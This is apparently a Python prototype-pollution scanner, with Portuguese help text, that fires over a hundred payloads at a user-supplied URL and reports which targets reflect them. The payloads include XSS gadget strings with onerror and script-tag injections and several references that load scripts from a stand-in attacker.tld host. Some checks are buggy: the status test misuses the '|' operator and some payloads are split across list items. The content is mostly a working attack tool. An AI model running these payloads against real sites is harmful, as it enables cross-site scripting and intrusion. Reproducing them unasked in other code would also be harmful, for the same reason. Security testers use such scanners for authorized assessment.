import requests
from termcolor import colored
import argparse
import sys
import time





payloads = [
    "?__proto__[test]=test",
    "?__proto__.test=test",
    "?constructor.prototype.test=test",
    "#__proto__[test]=test",
    "?__proto__[test]={\"json""\":""\"value""\"}",
    "?constructor.prototype.test=test",
    "?__proto__.array=1|2|3",
    "?constructor[prototype][test]=test",
    "?__proto__[NUMBER]=test",
    "?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>",
    "?__proto__[context]=<img/src/onerror%3dalert(1)>",
    "&__proto__[jquery]=x",
    "?__proto__[url][]=data:,alert(1)//",
    "&__proto__[dataType]=script",
    "?__proto__[url]=data:,alert(1)//",
    "&__proto__[dataType]=script",
    "&__proto__[crossDomain]=",
    "?__proto__[src][]=data:,alert(1)//",
    "?__proto__[url]=data:,alert(1)//",
    "?__proto__[div][0]=1",
    "&__proto__[div][1]=<img/src/onerror%3dalert(1)>",
    "?__proto__[preventDefault]=x",
    "&__proto__[handleObj]=x",
    "&__proto__[delegateTarget]=<img/src/onerror%3dalert(1)>",
    "?__proto__[srcdoc][]=<script>alert(1)</script>",
    "?__proto__[hif][]=javascript:alert(1)",
    "?__proto__[attrs][src]=1",
    "&__proto__[src]=data:,alert(1)//",
    "?__proto__[BOOMR]=1",
    "&__proto__[url]=//attacker.tld/js.js",
    "?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)",
    "?__proto__[innerText]=<script>alert(1)</script>",
    "?__proto__[whiteList][img][0]=onerror",
    "&__proto__[whiteList][img][1]=src",
    "?__proto__[ALLOWED_ATTR][0]=onerror",
    "&__proto__[ALLOWED_ATTR][1]=src",
    "?__proto__[documentMode]=9",
    "?__proto__[*%20ONERROR]=1",
    "&__proto__[*%20SRC]=1",
    "?__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//",
    "?__proto__[tagName]=img",
    "&__proto__[src][]=x:",
    "&__proto__[onerror][]=alert(1)",
    "?__proto__[src]=data:,alert(1)//",
    "?__proto__[SRC]=<img/src/onerror%3dalert(1)>",
    "?__proto__[xxx]=alert(1)",
    "?__proto__[onload]=alert(1)",
    "?__proto__[script][0]=1",
    "&__proto__[script][1]=<img/src/onerror%3dalert(1)>",
    "?__proto__[4]=a':1,[alert(1)]:1,'b",
    "&__proto__[5]=,",
    "?__proto__[onerror]=alert(1)",
    "?__proto__[html]=<img/src/onerror%3dalert(1)>",
    "??__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>",
    "?__proto__[div][intro]=<img%20src%20onerror%3dalert(1)>",
    "?__proto__[v-if]=_c.constructor('alert(1)')()",
    "?__proto__[attrs][0][name]=src",
    "&__proto__[attrs][0][value]=xxx",
    "&__proto__[xxx]=data:,alert(1)//",
    "&__proto__[is]=script",
    "?__proto__[v-",
    "bind:class]=''.constructor.constructor('alert(1)')()",
    "?__proto__[data]=a",
    "&__proto__[template][nodeType]=a",
    "&__proto__[template][innerHTML]=<script>alert(1)</script>",
    "?__proto__[props][][value]=a",
    "&__proto__[name]="":"".constructor.constructor('alert(1)')(),",
    "?__proto__[template]=<script>alert(1)</script>",
    "?__proto__[Config][SiteOptimization][enabled]=1",
    "&__proto__[Config][SiteOptimization]",
    "[recommendationApiURL]=//attacker.tld/json_cors.php?",
    "?__proto__[customScriptSrc]=//attacker.tld/xss.js",
    "?__proto__[lng]=cimode",
    "&__proto__[appendNamespaceToCIMode]=x",
    "&__proto__[nsSeparator]=<img/src/onerror%3dalert(1)>",
    "?__proto__[lng]=a",
    "&__proto__[a]=b",
    "&__proto__[obj]=c",
    "&__proto__[k]=d",
    "&__proto__[d]=<img/src/onerror%3dalert(1)>",
    "&__proto__[key]=<img/src/onerror%3dalert(1)>",
    "	?__proto__[cookieName]=COOKIE%3DInjection%3B",
    "?__proto__[arrow][style]=color:red;transition:all%201s",
    "&__proto__[arrow][ontransitionend]=alert(1)",
    "?__proto__[reference]",
    "[style]=color:red;transition:all%201s",
    "&__proto__[reference][ontransitionend]=alert(2)",
    "?__proto__[popper][style]=color:red;transition:all%201s",
    "&__proto__[popper][ontransitionend]=alert(3)",
    "?__proto__[dataHost]=attacker.tld/js.js%23",
    "?x=x&x[constructor][__parseStyleElement][innerHTML]=<img/src/onerror%3dalert(1)>",
    "?__proto__[assethost]=javascript:alert(1)//",
    "?__proto__[trustedTypes]=x",
    "&__proto__[emptyHTML]=<img/src/onerror%3dalert(1)>",
    "?__proto__[vtp_enableRecaptcha]=1",
    "&__proto__[srcdoc]=<script>alert(1)</script>",
    "?__proto__[q][0][0]=require",
    "&__proto__[q][0][1]=x",
    "&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7",
    "?__proto__[q][0][0]=require",
    "&__proto__[q][0][1]=x",
    "&__proto__[q][0][2]=https://www.google-analytics.com/gtm/js%3Fid%3DGTM-WXTDWH7",
    "?__proto__[123]=test"
   
    

]

payloads_js = [{"__proto__": {"polluted": "true"}},
               {"__proto__": {"polluted": "false"}},
               {"polluted": {"__proto__": "injected"}}]



parser = argparse.ArgumentParser(description='Para usar enviando na url como payload logo apos o ?= use o -p | se não use o -j para enviar como json no corpo')
parser.add_argument("-u", "--url", required=True, help="Coloque a url")
parser.add_argument("-p", "--pay", help="Enviar Payload na url",action="store_true")
parser.add_argument("-j", "--json", help="Enviar payload em formato json", action="store_true")

args = parser.parse_args()
url = args.url





#inserindo payloads em js
def test_prototype_pollution(url, payloads):

    for pay in payloads:
        payload_parts = pay.split("=")
        second_part = payload_parts[1]
        start = time.perf_counter()
        response = requests.get(url+str(pay))
        end = time.perf_counter()
        tempo_total = end - start  
        response_time = round(tempo_total, 2) 
        if response.status_code == 200 | 500 and second_part in response.text:
            print(colored(f"{url} É vulneravel a prototype pollution!",'red'))
            print(colored(f"Tempo de resposta {response_time } ",'yellow'))
        else:
            print(colored(f"{url} {pay} Não é vulneravel. ",'green'))
            print(colored(f"Tempo de resposta {response_time } ",'yellow'))

def test_prototype_pollution2(url, payloads_js):

    for pay in payloads_js:
        
        start = time.perf_counter()
        response = requests.post(url, json=pay)
        end = time.perf_counter()
        tempo_total = end - start  
        response_time = round(tempo_total, 2)
        if response.status_code == 200 | 500 and "polluted" in response.text:
            print(colored(f"{url} É vulneravel a prototype pollution!",'red'))
            print(colored(f"Tempo de resposta {response_time } ",'yellow'))
        else:
            print(colored(f"{url} {pay} Não é vulneravel. ",'green'))
            print(colored(f"Tempo de resposta {response_time } ",'yellow'))



if args.pay:
    
    test_prototype_pollution(url,payloads)

elif args.json:
    test_prototype_pollution2(url,payloads_js)
if not any([args.url, args.json]):
    parser.print_help()
    sys.exit()
